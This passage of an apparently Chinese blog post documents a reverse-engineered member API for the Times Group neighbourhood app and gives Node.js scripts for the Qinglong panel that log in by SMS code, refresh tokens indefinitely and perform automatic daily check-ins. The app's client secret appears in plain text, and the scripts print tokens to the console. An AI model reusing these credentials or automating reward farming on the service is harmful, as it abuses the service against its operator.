class="token punctuation">,</span>    <span class="token string">"email"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"grow"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"integral"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">"integralTotal"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">"isDeleted"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"isEnable"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"isShowRealName"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"memberCardRelats"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token string">"createTime"</span><span class="token operator">:</span> <span class="token number">1702007451000</span><span class="token punctuation">,</span>        <span class="token string">"createUser"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token string">"expirationTime"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"grow"</span><span class="token operator">:</span> <span class="token number">300</span><span class="token punctuation">,</span>        <span class="token string">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"isDeleted"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token string">"levelId"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"levelName"</span><span class="token operator">:</span> <span class="token string">"普通会员"</span><span class="token punctuation">,</span>        <span class="token string">"memberCardId"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token string">"memberCardImage"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token string">"memberCardName"</span><span class="token operator">:</span> <span class="token string">"时代邻里会员卡"</span><span class="token punctuation">,</span>        <span class="token string">"memberCode"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token string">"memberId"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"rangeBegin"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token string">"rangeEnd"</span><span class="token operator">:</span> <span class="token number">5000</span><span class="token punctuation">,</span>        <span class="token string">"updateTime"</span><span class="token operator">:</span> <span class="token number">1702187857000</span><span class="token punctuation">,</span>        <span class="token string">"updateUser"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token string">"upgradedTime"</span><span class="token operator">:</span> <span class="token number">1702007451000</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"memberCode"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>    <span class="token string">"memberId"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token string">"memberIdStr"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>    <span class="token string">"memberImage"</span><span class="token operator">:</span> <span class="token string">"https://thirdwx.qlogo.cn/mmopen/vi_32"</span><span class="token punctuation">,</span>    <span class="token string">"memberName"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"memberSources"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token string">"createTime"</span><span class="token operator">:</span> <span class="token number">1702007451000</span><span class="token punctuation">,</span>        <span class="token string">"createUser"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token string">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"isDeleted"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token string">"memberId"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"sourceCode"</span><span class="token operator">:</span> <span class="token string">"linlipro"</span><span class="token punctuation">,</span>        <span class="token string">"updateTime"</span><span class="token operator">:</span> <span class="token number">1702007451000</span><span class="token punctuation">,</span>        <span class="token string">"updateUser"</span><span class="token operator">:</span> <span class="token number">2</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"memberType"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"memo"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"phone"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"phoneAreaCode"</span><span class="token operator">:</span> <span class="token string">"86"</span><span class="token punctuation">,</span>    <span class="token string">"realName"</span><span class="token operator">:</span> <span class="token string">"微信用户"</span><span class="token punctuation">,</span>    <span class="token string">"sex"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"updateTime"</span><span class="token operator">:</span> <span class="token number">1735185253000</span><span class="token punctuation">,</span>    <span class="token string">"updateUser"</span><span class="token operator">:</span> <span class="token number">2</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token string">"message"</span><span class="token operator">:</span> <span class="token string">"success"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul><li>接口：<a href="https://m-center-prod-linli.timesgroup.cn/times/member-bff/user-behaviour//api-c/v1/user-behaviour/collect">https://m-center-prod-linli.timesgroup.cn/times/member-bff/user-behaviour//api-c/v1/user-behaviour/collect</a></li><li>请求方法：POST</li><li>请求头<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 第二步返回来的 token 拼接在 `Bearer `后</span><span class="token punctuation">&#123;</span>  headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    Authorization<span class="token operator">:</span> <span class="token string">'Bearer eyJhbGciOiJSU'</span><span class="token punctuation">,</span>    Content<span class="token operator">-</span>Type<span class="token operator">:</span> <span class="token string">'application/json'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>请求参数<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// memberId 为第三步返回的 memberId</span><span class="token comment">// createTime、sign为当前时间 格式：YYYY-MM-DD HH:mm:ss</span><span class="token punctuation">&#123;</span>  <span class="token string">"behaviourId"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token string">"clientCode"</span><span class="token operator">:</span> <span class="token string">"sys_linlibang"</span><span class="token punctuation">,</span>  <span class="token string">"createTime"</span><span class="token operator">:</span> <span class="token string">"2024-11-27 08:19:45"</span><span class="token punctuation">,</span>  <span class="token string">"mapPamater"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sign"</span><span class="token operator">:</span> <span class="token string">"2024-11-27 08:19:45"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token string">"memberId"</span><span class="token operator">:</span> <span class="token string">"12332131232133"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>返回结果<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  code<span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  data<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  message<span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="自动刷新-token"><a href="#自动刷新-token" class="headerlink" title="自动刷新 token"></a>自动刷新 token</h2><ul><li><p>token 过期时间，当前测试为 8 小时过期，需要在过期前刷新 token，下次签到就不用重新获取验证码登录（理论上可以无限续期）</p></li><li><p>接口：<a href="https://m-center-prod-linli.timesgroup.cn/times/auth/oauth/token">https://m-center-prod-linli.timesgroup.cn/times/auth/oauth/token</a></p></li><li><p>请求方法：POST</p></li><li><p>请求参数（FormData 格式）</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// grant_type=refresh_token&amp;client_secret=times&amp;client_id=app_c&amp;scope=all&amp;refresh_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2iMava32uw</span><span class="token comment">// 第一次刷新：refresh_token 需要设置为第二步获取返回来的 refreshToken</span><span class="token comment">// 第一次以后的刷新：refresh_token 获取本接口返回来的 refreshToken 即可</span><span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"grant_type"</span><span class="token punctuation">,</span> <span class="token string">"refresh_token"</span><span class="token punctuation">)</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"client_secret"</span><span class="token punctuation">,</span> <span class="token string">"times"</span><span class="token punctuation">)</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"client_id"</span><span class="token punctuation">,</span> <span class="token string">"app_c"</span><span class="token punctuation">)</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span>formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"refresh_token"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>返回结果</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token string">"code"</span><span class="token operator">:</span><span class="token number">200</span><span class="token punctuation">,</span>  <span class="token string">"data"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token string">"expiresIn"</span><span class="token operator">:</span><span class="token number">86399</span><span class="token punctuation">,</span>    <span class="token string">"refreshToken"</span><span class="token operator">:</span><span class="token string">"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2"</span><span class="token punctuation">,</span>    <span class="token string">"token"</span><span class="token operator">:</span><span class="token string">"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25"</span><span class="token punctuation">,</span>    <span class="token string">"tokenHead"</span><span class="token operator">:</span><span class="token string">"Bearer "</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token string">"message"</span><span class="token operator">:</span><span class="token string">"操作成功"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="青龙脚本使用（手动导入）"><a href="#青龙脚本使用（手动导入）" class="headerlink" title="青龙脚本使用（手动导入）"></a>青龙脚本使用（手动导入）</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul><li>打开青龙面板 - 脚本管理 - 新建文件夹 <code>times_script</code></li><li>在 <code>times_script</code> 下新建如下几个文件</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// config.json</span><span class="token punctuation">&#123;</span>  <span class="token string">"token"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token string">"refreshToken"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// times_get_code.js</span><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"axios"</span><span class="token punctuation">)</span><span class="token comment">// 获取配置文件，手机号和验证码 &#123;"phone":"13412341234","code":"123456"&#125;</span><span class="token comment">// 如果 token 和 refreshToken 都为空时就获取 或者 isNweOne 为 true 时获取</span><span class="token keyword">function</span> <span class="token function">getTimesConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> timesConfig <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">TIMES_CONFIG</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>timesConfig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取到的API_KEY环境变量值为:"</span><span class="token punctuation">,</span> timesConfig<span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"API_KEY环境变量值转为JSON格式:"</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>timesConfig<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>timesConfig<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"未获取到API_KEY环境变量"</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">""</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取timesConfig时出错："</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取验证码</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getVerifyCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> timesConfig <span class="token operator">=</span> <span class="token function">getTimesConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      phoneNumber<span class="token operator">:</span> timesConfig<span class="token punctuation">.</span>phone<span class="token punctuation">,</span>      areaCode<span class="token operator">:</span> <span class="token string">"86"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"请求参数："</span><span class="token punctuation">,</span> params<span class="token punctuation">)</span>    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> data <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>      <span class="token string">"https://m-center-prod-linli.timesgroup.cn/times/pub-center/verifycode/api/v1/send"</span><span class="token punctuation">,</span>      params<span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取验证码结果："</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取验证码时出错："</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取验证码</span><span class="token function">getVerifyCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// times_get_token.js</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"axios"</span><span class="token punctuation">)</span><span class="token comment">// 获取配置文件，手机号和验证码 &#123;"phone":"13412341234","code":"123456"&#125;</span><span class="token keyword">function</span> <span class="token function">getTimesConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> timesConfig <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">TIMES_CONFIG</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>timesConfig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取到的API_KEY环境变量值为:"</span><span class="token punctuation">,</span> timesConfig<span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"API_KEY环境变量值转为JSON格式:"</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>timesConfig<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>timesConfig<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"未获取到API_KEY环境变量"</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">""</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取timesConfig时出错："</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义config.json文件的路径，假设它与脚本在同一目录下</span><span class="token keyword">const</span> configPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"config.json"</span><span class="token punctuation">)</span><span class="token comment">// 读取文件</span><span class="token keyword">function</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> existingData <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>configPath<span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"读取config.json数据："</span><span class="token punctuation">,</span> existingData<span class="token punctuation">)</span>  <span class="token keyword">return</span> existingData<span class="token punctuation">&#125;</span><span class="token comment">// 写入数据</span><span class="token keyword">function</span> <span class="token function">writeConfigFile</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> token<span class="token punctuation">,</span> refreshToken <span class="token punctuation">&#125;</span> <span class="token operator">=</span> data    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> refreshToken<span class="token punctuation">)</span>    <span class="token keyword">let</span> configData <span class="token operator">=</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">!==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      configData<span class="token punctuation">.</span>token <span class="token operator">=</span> token    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>refreshToken <span class="token operator">!==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      configData<span class="token punctuation">.</span>refreshToken <span class="token operator">=</span> refreshToken    <span class="token punctuation">&#125;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>configPath<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>configData<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"修改后的config.json数据："</span><span class="token punctuation">,</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"修改config.json时出错："</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 通过验证码获取token</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNewToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> timesConfig <span class="token operator">=</span> <span class="token function">getTimesConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    grant_type<span class="token operator">:</span> <span class="token string">"sms_code"</span><span class="token punctuation">,</span>    scope<span class="token operator">:</span> <span class="token string">"all"</span><span class="token punctuation">,</span>    client_id<span class="token operator">:</span> <span class="token string">"mini_charge"</span><span class="token punctuation">,</span>    client_secret<span class="token operator">:</span> <span class="token string">"times"</span><span class="token punctuation">,</span>    username<span class="token operator">:</span> timesConfig<span class="token punctuation">.</span>phone<span class="token punctuation">,</span>    password<span class="token operator">:</span> timesConfig<span class="token punctuation">.</span>code<span class="token punctuation">,</span>    areaCode<span class="token operator">:</span> <span class="token string">"86"</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> data <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>    <span class="token string">"https://m-center-prod-linli.timesgroup.cn/times/times-bff/bff/api-c/v1/oauth/token"</span><span class="token punctuation">,</span>    params<span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取token结果："</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">writeConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      token<span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>authUserDTO<span class="token punctuation">.</span>token<span class="token punctuation">,</span>      refreshToken<span class="token operator">:</span> data<span class="token punctuation">.</span>data<span class="token punctuation">.</span>authUserDTO<span class="token punctuation">.</span>refreshToken<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"获取token时出错："</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>message<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取token</span><span class="token function">getNewToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// times_refresh_token.js</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"axios"</span><span class="token punctuation">)</span><span class="token keyword">const</span> FormData <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"form-data"</span><span class="token punctuation">)</span><span class="token comment">// 定义config.json文件的路径，与脚本在同一目录下</span><span class="token keyword">const</span> configPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"config.json"</span><span class="token punctuation">)</span><span class="token comment">// 读取文件</span><span class="token keyword">function</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> existingData <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>configPath<span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"读取config.json数据："</span><span class="token punctuation">,</span> existingData<span class="token punctuation">)</span>  <span class="token keyword">return</span> existingData<span class="token punctuation">&#125;</span><span class="token comment">// 写入数据</span><span class="token keyword">function</span> <span class="token function">writeConfigFile</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> token<span class="token punctuation">,</span> refreshToken <span class="token punctuation">&#125;</span> <span class="token operator">=</span> data    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> refreshToken<span class="token punctuation">)</span>    <span class="token keyword">let</span> configData <span class="token operator">=</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token 